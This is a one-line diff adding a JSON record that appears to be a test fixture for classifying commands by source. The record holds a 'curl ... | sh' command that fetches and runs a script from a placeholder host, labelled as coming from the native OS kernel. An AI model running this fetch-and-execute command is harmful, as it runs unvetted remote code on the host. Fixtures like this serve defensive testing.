@@ -1,0 +1,1 @@
+{"command":"curl -s SENSITIVE-DOT-HOST | sh","source_class":"native_os","provenance":"kernel"}
